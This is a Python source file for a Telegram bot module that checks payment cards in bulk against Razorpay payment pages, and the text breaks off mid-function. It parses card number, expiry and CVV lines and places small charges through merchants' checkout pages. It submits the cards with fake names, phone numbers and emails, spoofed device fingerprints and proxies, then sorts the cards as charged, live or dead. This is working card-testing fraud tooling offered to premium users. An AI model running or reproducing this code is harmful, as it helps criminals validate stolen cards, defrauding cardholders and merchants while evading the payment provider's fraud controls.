import aiohttp
import asyncio
import base64
import hashlib
import json
import os
import random
import re
import string
import time
import aiofiles
from telethon import events, Button

# ─── CONFIG ────────────────────────────────────────────────────────────────────
MAX_CARDS      = 50000
MAX_SITES      = 10
_RZ_SITES_FILE = "razorpay_sites.json"
_rz_sites: dict      = {}   # {user_id: [url1, url2, ...]}
_rz_data_cache: dict = {}   # {url: {keyless_header, plink, ppid, key_id}}

BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
RZ_API   = "https://api.razorpay.com"

# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
def _load_rz_sites():
    global _rz_sites
    try:
        with open(_RZ_SITES_FILE) as f:
            data = json.load(f)
        _rz_sites = {int(k): v if isinstance(v, list) else [v] for k, v in data.items()}
    except Exception:
        _rz_sites = {}

def _save_rz_sites():
    try:
        with open(_RZ_SITES_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _rz_sites.items()}, f)
    except Exception:
        pass

def _get_user_rz_sites(uid):   return _rz_sites.get(uid, [])

def _add_user_rz_site(uid, url):
    sites = _rz_sites.get(uid, [])
    if url not in sites:
        sites.append(url)
    _rz_sites[uid] = sites
    _save_rz_sites()

def _remove_user_rz_site(uid, idx):
    sites = _rz_sites.get(uid, [])
    if 0 <= idx < len(sites):
        removed = sites.pop(idx)
        _rz_data_cache.pop(removed, None)
        _rz_sites[uid] = sites
        _save_rz_sites()
        return removed
    return None

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def _parse_proxy(p):
    if not p: return None
    if '://' in p: return p
    parts = p.split(':')
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _extract_cc(text):
    pattern = re.compile(r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b')
    seen, cards = set(), []
    for m in pattern.finditer(text):
        c = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if c not in seen:
            seen.add(c)
            cards.append(c)
    return cards

def _random_email():
    names = ['alex', 'john', 'mike', 'sara', 'david', 'emma', 'james', 'lisa', 'chris', 'anna']
    return random.choice(names) + str(random.randint(100, 9999)) + '@gmail.com'

def _random_phone():
    first = random.choice(['6', '7', '8', '9'])
    return '+91' + first + ''.join(random.choices('0123456789', k=9))

def _random_name():
    first = random.choice(['Rahul', 'Amit', 'Vikram', 'Raj', 'Arjun', 'Suresh', 'Deepak'])
    last  = random.choice(['Sharma', 'Kumar', 'Singh', 'Patel', 'Verma', 'Gupta'])
    return first, last

def _gen_device_id():
    buf  = os.urandom(16)
    h    = hashlib.sha1(buf).hexdigest()
    ts   = str(int(time.time() * 1000))
    rnd  = str(random.randint(0, 99999999)).zfill(8)
    return f"1.{h}.{ts}.{rnd}", h

def _gen_session_id():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choices(chars, k=14))

# ─── PAGE DATA EXTRACTION ──────────────────────────────────────────────────────
def _brace_parse(html: str, start: int):
    depth, in_str, escaped = 0, False, False
    for i, c in enumerate(html[start:]):
        if escaped:          escaped = False; continue
        if c == '\\' and in_str: escaped = True; continue
        if c == '"':         in_str = not in_str; continue
        if in_str:           continue
        if c == '{':         depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                try:    return json.loads(html[start:start+i+1])
                except: return None
    return None

def _deep_find_keyless(obj, depth=0):
    """Recursively search any nested dict/list for a dict containing keyless_header."""
    if depth > 15:
        return None
    if isinstance(obj, dict):
        if obj.get('keyless_header'):
            return obj
        for v in obj.values():
            r = _deep_find_keyless(v, depth + 1)
            if r:
                return r
    elif isinstance(obj, list):
        for item in obj:
            r = _deep_find_keyless(item, depth + 1)
            if r:
                return r
    return None

def _extract_var_data(html: str):
    # Try var data = {...}
    m = re.search(r'var data\s*=\s*(\{)', html)
    if m:
        result = _brace_parse(html, m.start(1))
        if result:
            return result

    # Try __NEXT_DATA__ (Next.js SSR) — search recursively for keyless_header
    m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>', html)
    if m:
        brace_pos = html.find('{', m.end())
        if brace_pos != -1:
            result = _brace_parse(html, brace_pos)
            if result:
                found = _deep_find_keyless(result)
                if found:
                    return found

    # Last resort: find keyless_header inline via regex
    m = re.search(r'"keyless_header"\s*:\s*"([^"]+)"', html)
    if m:
        keyless = m.group(1)
        plink_m = re.search(r'"id"\s*:\s*"(pl_[^"]+)"', html)
        ppid_m  = re.search(r'"id"\s*:\s*"(ppi_[^"]+)"', html)
        key_m   = re.search(r'"key_id"\s*:\s*"([^"]*)"', html)
        if plink_m:
            return {
                'keyless_header': keyless,
                'key_id':  key_m.group(1) if key_m else '',
                'payment_link': {
                    'id': plink_m.group(1),
                    'payment_page_items': [{'id': ppid_m.group(1)}] if ppid_m else [],
                }
            }
    return None

def _parse_site_info(data: dict):
    if not data:
        return None
    keyless = data.get('keyless_header', '')
    key_id  = data.get('key_id') or ''
    pl      = data.get('payment_link') or data.get('payment_page') or {}
    plink   = pl.get('id', '')
    items   = pl.get('payment_page_items', [])
    ppid    = items[0].get('id', '') if items else ''
    if not keyless or not plink:
        return None
    return {'keyless_header': keyless, 'plink': plink, 'ppid': ppid, 'key_id': key_id}

async def _get_site_data(site, proxy=None):
    """Fetch and cache site data (keyless_header, plink, ppid) from page."""
    if site in _rz_data_cache:
        return _rz_data_cache[site]
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
                headers={'User-Agent': UA,
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                         'Accept-Language': 'en-US,en;q=0.5'},
                connector=connector) as sess:
            async with sess.get(site, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=15),
                    allow_redirects=True) as resp:
                html = await resp.text(errors='ignore')
        data = _extract_var_data(html)
        info = _parse_site_info(data)
        if info:
            _rz_data_cache[site] = info
        return info
    except Exception:
        return None

# ─── CORE CHECKER ──────────────────────────────────────────────────────────────
_LIVE_REASONS = {
    'insufficient_funds', 'card_velocity_exceeded', 'do_not_honor',
    'not_permitted', 'restricted_card', 'security_violation',
    'transaction_not_permitted', 'incorrect_cvv',
}
_LIVE_KEYWORDS = ['insufficient', 'do not honor', 'not permitted',
                  'restricted', 'security violation', 'transaction limit', 'cvv']

async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
    p = card.strip().split('|')
    if len(p) != 4:
        return {'status': 'Error', 'message': 'Invalid format', 'card': card}

    cc, mm, yy, cvv = p
    yy    = ('20' + yy) if len(yy) == 2 else yy
    proxy = _parse_proxy(proxy_str)

    keyless = site_data['keyless_header']
    plink   = site_data['plink']
    ppid    = site_data['ppid']
    key_id  = site_data.get('key_id') or ''

    first, last  = _random_name()
    card_name    = f"{first} {last}"
    phone        = _random_phone()
    phone_short  = phone.lstrip('+91').lstrip('+')
    email        = _random_email()
    device_id, fhash = _gen_device_id()
    session_id   = _gen_session_id()

    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:

            # ── Step 1: Create order ────────────────────────────────────────
            _order_body = {'notes': {'comment': '', 'name': card_name}}
            if ppid:
                _order_body['line_items'] = [{'payment_page_item_id': ppid, 'amount': 100}]
            async with s.post(
                f'{RZ_API}/v1/payment_pages/{plink}/order',
                params={'keyless_header': keyless},
                json=_order_body,
                headers={
                    'Accept':       'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin':       'https://razorpay.me',
                    'Referer':      site + '/',
                },
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                order_data = await r.json(content_type=None)

            order_obj    = order_data.get('order', {})
            order_id     = order_obj.get('id', '')
            if not order_id:
                desc = order_data.get('error', {}).get('description', 'Order creation failed')
                return {'status': 'Error', 'message': desc, 'card': card}

            order_amount   = max(order_obj.get('amount', 100), 100)
            order_currency = order_obj.get('currency', 'INR')
            checkout_id    = order_id.split('_', 1)[-1] if '_' in order_id else order_id

            # ── Step 2: Get session token ────────────────────────────────────
            async with s.get(
                f'{RZ_API}/v1/checkout/public',
                params={
                    'traffic_env':        'production',
                    'build':              BUILD,
                    'build_v1':           BUILD_V1,
                    'checkout_v2':        '1',
                    'new_session':        '1',
                    'keyless_header':     keyless,
                    'rzp_device_id':      device_id,
                    'unified_session_id': session_id,
                },
                headers={'Accept': 'text/html,application/xhtml+xml,*/*',
                         'Referer': 'https://razorpay.me/'},
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                r3_text = await r.text(errors='ignore')

            sess_m = re.search(r'window\.session_token="([^"]+)"', r3_text)
            if not sess_m:
                sess_m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3_text)
            if not sess_m:
                return {'status': 'Error', 'message': 'Session token not found', 'card': card}
            sessid = sess_m.group(1)

            rzp_ref = (f'{RZ_API}/v1/checkout/public?traffic_env=production'
                       f'&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1'
                       f'&new_session=1&unified_session_id={session_id}'
                       f'&session_token={sessid}')
            std_h = {
                'Accept':          '*/*',
                'Origin':          'https://api.razorpay.com',
                'Referer':         rzp_ref,
                'x-session-token': sessid,
            }

            # ── Step 3: Preferences (warmup) ────────────────────────────────
            _pref_resources = [
                'checkout_version_config', 'merchant', 'merchant_features', 'downtime',
                'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments',
                'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization',
            ]
            try:
                await s.post(
                    f'{RZ_API}/v2/standard_checkout/preferences',
                    params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless},
                    json={
                        'query': [{'resource': r} for r in _pref_resources],
                        'query_params': {
                            'device_id': device_id, 'rtb_device_id': fhash,
                            'amount': order_amount, 'currency': order_currency,
                            'option_currency': order_currency, 'truecaller': False,
                            'qr_required': False, 'library': 'checkoutjs',
                            'platform': 'browser', 'order_id': order_id,
                            'payment_link_id': plink, 'contact': phone,
                        },
                        'action': 'get',
                    },
                    headers={**std_h, 'Content-Type': 'application/json'},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                )
            except Exception:
                pass

            # ── Step 4: Checkout order context ──────────────────────────────
            try:
                await s.post(
                    f'{RZ_API}/v1/standard_checkout/checkout/order',
                    params={'key_id': key_id, 'session_token': sessid, 'keyless_header': keyless},
                    data={
                        'notes[email]': email, 'notes[phone]': phone_short,
                        'payment_link_id': plink, 'key_id': key_id,
                        'contact': phone, 'email': email, 'currency': order_currency,
                        '_[integration]': 'payment_pages', '_[device.id]': device_id,
                        '_[library]': 'checkoutjs', '_[library_src]': 'no-src',
                        '_[current_script_src]': 'no-src', '_[platform]': 'browser',
                        '_[env]': '', '_[is_magic_script]': 'false',
                        '_[os]': 'windows', '_[build]': BUILD,
                        '_[shield][fhash]': fhash, '_[shield][tz]': '0',
                        '_[device_id]': device_id,
                        '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                        '_[shield][browser]': 'chrome', '_[request_index]': '0',
                        'amount': str(order_amount), 'order_id': order_id,
                        'method': 'card', 'checkout_id': checkout_id,
                    },
                    headers={**std_h, 'Content-Type': 'application/x-www-form-urlencoded'},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                )
            except Exception:
                pass

            # ── Step 5: Submit card payment ──────────────────────────────────
            token_b64 = base64.b64encode(
                json.dumps([{'name': 'sardine',
                             'metadata': {'session_id': checkout_id}}]).encode()
            ).decode()

            async with s.post(
                f'{RZ_API}/v1/standard_checkout/payments/create/ajax',
                params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless},
                data={
                    'user_risk_providers_token': token_b64,
                    'notes[comment]': '', 'notes[email]': email,
                    'notes[phone]': phone_short, 'notes[name]': card_name,
                    'payment_link_id': plink, 'key_id': key_id,
                    'contact': phone, 'email': email, 'currency': order_currency,
                    '_[integration]': 'payment_pages', '_[checkout_id]': checkout_id,
                    '_[device.id]': device_id, '_[env]': '',
                    '_[library]': 'checkoutjs', '_[library_src]': 'no-src',
                    '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
                    '_[platform]': 'browser', '_[referer]': site + '/',
                    '_[shield][fhash]': fhash, '_[shield][tz]': '-330',
                    '_[device_id]': device_id, '_[build]': BUILD,
                    '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                    '_[shield][browser]': 'chrome', '_[request_index]': '1',
                    'amount': str(order_amount), 'order_id': order_id,
                    'method': 'card', 'card[number]': cc, 'card[cvv]': cvv,
                    'card[name]': card_name, 'card[expiry_month]': mm.zfill(2),
                    'card[expiry_year]': yy, 'save': '0', 'dcc_currency': order_currency,
                },
                headers=std_h,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                r7 = await r.json(content_type=None)

            payment_id = r7.get('payment_id') or r7.get('id', '')

            if not payment_id:
                err_obj = r7.get('error', {})
                desc    = err_obj.get('description', '').replace(
                    ' Try another payment method or contact your bank for details.', '').strip()
                reason  = err_obj.get('reason', '')
                label   = f"{desc} ({reason})" if reason and reason not in desc else desc
                if any(k in desc.lower() for k in _LIVE_KEYWORDS) or reason in _LIVE_REASONS:
                    return {'status': 'Live', 'message': label or 'Live', 'card': card}
                return {'status': 'Dead', 'message': label or 'Declined', 'card': card}

            pid_clean = payment_id.split('_', 1)[-1] if '_' in payment_id else payment_id

            # 3DS / OTP — return Live immediately
            nxt = r7.get('next', {})
            if nxt and nxt.get('action') in ('redirect', 'otp_generate', 'otp_validate'):
                return {'status': 'Live', 'message': '3DS / OTP Required', 'card': card}

            # ── Step 6: pg_router authenticate (3DS trigger) ────────────────
            _screens = [[1920, 1080], [1366, 768], [1536, 864], [1440, 900]]
            _sc      = random.choice(_screens)
            _depth   = random.choice([24, 32])
            try:
                await s.post(
                    f'{RZ_API}/pg_router/v1/payments/{payment_id}/authenticate',
                    data={},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)
                )
            except Exception:
                pass
            await asyncio.sleep(1)
            try:
                await s.post(
                    f'{RZ_API}/pg_router/v1/payments/{pid_clean}/authenticate',
                    data={
                        'browser[java_enabled]':       'false',
                        'browser[javascript_enabled]': 'true',
                        'browser[timezone_offset]':    '0',
                        'browser[color_depth]':        str(_depth),
                        'browser[screen_width]':       str(_sc[0]),
                        'browser[screen_height]':      str(_sc[1]),
                        'browser[language]':           'en-US',
                        'auth_step':                   '3ds2Auth',
                    },
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)
                )
            except Exception:
                pass

            # ── Step 7: Cancel + read result ────────────────────────────────
            cancel_text = ''
            try:
                async with s.get(
                    f'{RZ_API}/v1/standard_checkout/payments/{payment_id}/cancel',
                    params={'key_id': key_id, 'session_token': sessid, 'keyless_header': keyless},
                    headers={**std_h, 'Content-Type': 'application/x-www-form-urlencoded'},
                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=12)
                ) as rc:
                    cancel_text = await rc.text(errors='ignore')
            except Exception:
                pass

            if 'razorpay_payment_id' in cancel_text:
                return {'status': 'Charged', 'message': f'Payment {payment_id}', 'card': card}

            try:
                c_data   = json.loads(cancel_text) if cancel_text else {}
                c_err    = c_data.get('error', {})
                c_desc   = c_err.get('description', '').replace(
                    ' Try another payment method or contact your bank for details.', '').strip()
                c_reason = c_err.get('reason', '')
                c_label  = f"{c_desc} ({c_reason})" if c_reason and c_reason not in c_desc else c_desc
                if any(k in c_desc.lower() for k in _LIVE_KEYWORDS) or c_reason in _LIVE_REASONS:
                    return {'status': 'Live', 'message': c_label or 'Live', 'card': card}
                if c_label:
                    return {'status': 'Dead', 'message': c_label, 'card': card}
            except Exception:
                pass

            return {'status': 'Dead', 'message': f'Cancelled ({payment_id})', 'card': card}

    except asyncio.TimeoutError:
        return {'status': 'Error', 'message': 'Timeout', 'card': card}
    except Exception as ex:
        return {'status': 'Error', 'message': str(ex)[:80], 'card': card}
    finally:
        await connector.close()

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):

    _load_rz_sites()

    # ── /rzadd ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzadd(\s|$)'))
    async def rzadd_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        parts = event.raw_text.split(maxsplit=1)
        url_raw = None

        if len(parts) >= 2:
            m = re.search(r'(https?://\S+)', parts[1])
            url_raw = m.group(1).rstrip('/') if m else parts[1].strip().split()[0]
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and (reply_msg.file.name or '').endswith('.txt'):
                fp = await reply_msg.download_media()
                try:
                    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = await f.read()
                    os.remove(fp)
                    m = re.search(r'https?://\S+', content)
                    if m: url_raw = m.group(0).rstrip('/')
                except Exception:
                    pass
            elif reply_msg and reply_msg.text:
                m = re.search(r'https?://\S+', reply_msg.text)
                if m: url_raw = m.group(0).rstrip('/')

        if not url_raw:
            await event.reply(
                "❌ <b>Usage:</b>\n"
                "▸ <code>/rzadd https://razorpay.me/@handle</code>\n"
                "▸ <code>/rzaddtxt</code> — bulk add from .txt file\n\n"
                "<i>Supports razorpay.me and pages.razorpay.com links.</i>",
                parse_mode='html'
            )
            return

        if len(_get_user_rz_sites(user_id)) >= MAX_SITES:
            await event.reply(f"❌ <b>Max {MAX_SITES} sites reached.</b>\nUse <code>/rzrem</code> first.", parse_mode='html')
            return

        url  = _normalize_url(url_raw)
        wait = await event.reply(
            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Fetching site data...</i>",
            parse_mode='html'
        )

        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None
        info    = await _get_site_data(url, proxy)

        if info:
            _add_user_rz_site(user_id, url)
            sites = _get_user_rz_sites(user_id)
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"✅  <b>𝗦𝗜𝗧𝗘  𝗔𝗗𝗗𝗘𝗗</b>  ✅\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>   ▸  <code>{url}</code>\n"
                f"🔑 <b>𝗣𝗟𝗜𝗡𝗞</b>  ▸  <code>{info['plink']}</code>\n"
                f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>  ▸  {len(sites)} / {MAX_SITES} sites\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )
        else:
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"❌  <b>𝗡𝗢  𝗗𝗔𝗧𝗔  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>  ▸  <code>{url}</code>\n\n"
                f"<i>Site se payment data nahi mila. Check karo URL sahi hai.</i>\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )

    # ── /rzaddtxt ──────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzaddtxt(\s|$)'))
    async def rzaddtxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/rzaddtxt</code>.", parse_mode='html')
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        wait = await event.reply(
            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Reading file and checking sites...</i>",
            parse_mode='html'
        )

        fp = await reply_msg.download_media()
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(fp)
        except Exception:
            await wait.edit("❌ Could not read file.", parse_mode='html')
            return

        all_urls = list(dict.fromkeys([u.rstrip('/') for u in re.findall(r'https?://\S+', content)]))
        if not all_urls:
            await wait.edit("❌ No URLs found in file.", parse_mode='html')
            return

        proxies = load_proxies_fn(user_id)
        added, skipped, failed = [], [], []

        for url in all_urls:
            url = _normalize_url(url)
            sites_now = _get_user_rz_sites(user_id)
            if len(sites_now) >= MAX_SITES or url in sites_now:
                skipped.append(url)
                continue
            proxy = random.choice(proxies) if proxies else None
            info  = await _get_site_data(url, proxy)
            if info:
                _add_user_rz_site(user_id, url)
                added.append((url, info['plink']))
            else:
                failed.append(url)

        total_now   = len(_get_user_rz_sites(user_id))
        added_lines = ''.join(f"✅ <code>{u}</code>  <i>{p}</i>\n" for u, p in added[:10]) or '<i>None added</i>'
        skip_txt    = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)}" if skipped else ''
        fail_txt    = f"\n❌ <b>Failed</b>   ▸  {len(failed)}" if failed else ''

        await wait.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"✅  <b>𝗕𝗨𝗟𝗞  𝗔𝗗𝗗  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ✅\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs\n"
            f"✅ <b>𝗔𝗗𝗗𝗘𝗗</b>   ▸  {len(added)}\n"
            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES}{skip_txt}{fail_txt}\n\n"
            f"〔 ✅  A D D E D 〕\n<blockquote>{added_lines}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rzlist ────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzlist(\s|$)'))
    async def rzlist_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return
        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply("❌ <b>No sites configured.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
            return
        lines = '\n'.join(
            f"<b>{i+1}.</b>  <code>{s}</code>"
            + (f"\n      🔑 <i>{_rz_data_cache[s]['plink']}</i>" if s in _rz_data_cache else "")
            for i, s in enumerate(sites)
        )
        await event.reply(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"🌐  <b>𝗥𝗔𝗭𝗢𝗥𝗣𝗔𝗬  𝗦𝗜𝗧𝗘𝗦</b>  [ {len(sites)} / {MAX_SITES} ]\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"{lines}\n\n"
            f"◈  Remove: <code>/rzrem &lt;number&gt;</code>\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rzrem ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzrem(\s|$)'))
    async def rzrem_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            await event.reply("❌ <b>Usage:</b> <code>/rzrem &lt;number&gt;</code>", parse_mode='html')
            return
        removed = _remove_user_rz_site(user_id, int(parts[1].strip()) - 1)
        if removed:
            await event.reply(f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n🌐 <code>{removed}</code>", parse_mode='html')
        else:
            await event.reply("❌ Invalid number. Use <code>/rzlist</code> to check.", parse_mode='html')

    # ── /rz ────────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rz(\s|$)'))
    async def rz_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply("❌ <b>No site set.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
            return

        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or parts[1].strip().count('|') != 3:
            await event.reply("❌ <b>Usage:</b> <code>/rz cc|mm|yy|cvv</code>", parse_mode='html')
            return

        card    = parts[1].strip()
        site    = random.choice(sites)
        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None

        info = _rz_data_cache.get(site) or await _get_site_data(site, proxy)
        if not info:
            await event.reply(f"❌ Cannot fetch data from <code>{site}</code>.\nTry <code>/rzrem</code> and add again.", parse_mode='html')
            return

        status_msg = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<code>{card}</code>",
            parse_mode='html'
        )
        t0     = time.time()
        result = await razorpay_check(card, site, info, proxy_str=proxy)
        elapsed = round(time.time() - t0, 2)

        status  = result['status']
        message = result['message']

        if status == 'Charged':
            s_emoji, s_text = '💎', '𝗖𝗛𝗔𝗥𝗚𝗘𝗗'
        elif status == 'Live':
            s_emoji, s_text = '🔥', '𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗'
        elif status == 'Dead':
            s_emoji, s_text = '❌', '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗'
        else:
            s_emoji, s_text = '⚠️', '𝗘𝗥𝗥𝗢𝗥'

        await status_msg.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"{s_emoji}  <b>{s_text}</b>  {s_emoji}\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗖𝗔𝗥𝗗</b>   ▸  <code>{card}</code>\n"
            f"◈  <b>𝗥𝗘𝗦𝗣</b>   ▸  <i>{message[:120]}</i>\n"
            f"🌐 <b>𝗚𝗪</b>     ▸  Razorpay Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rztxt ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rztxt(\s|$)'))
    async def rztxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply("❌ <b>No site set.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
            return

        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/rztxt</code>.", parse_mode='html')
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        # Pre-warm data cache
        proxies = load_proxies_fn(user_id)
        for _s in list(sites):
            if _s not in _rz_data_cache:
                _p = random.choice(proxies) if proxies else None
                await _get_site_data(_s, _p)

        valid_sites = [s for s in sites if s in _rz_data_cache]
        if not valid_sites:
